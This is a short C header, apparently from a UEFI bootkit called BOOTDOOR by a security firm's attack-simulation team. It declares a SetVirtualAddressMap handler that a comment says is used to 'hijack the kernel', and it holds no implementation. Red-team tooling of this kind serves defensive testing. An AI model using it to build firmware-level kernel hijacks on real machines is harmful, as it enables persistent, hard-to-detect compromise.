/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Acquires the virtual address of our image
 * in memory so that can hijack the kernel.
 *
!*/
D_SEC( B ) EFI_STATUS EFIAPI SetVirtualAddressMap( UINTN MemoryMapSize, UINTN DescriptorSize, UINT32 DescriptorVersion, EFI_MEMORY_DESCRIPTOR * VirtualMap );
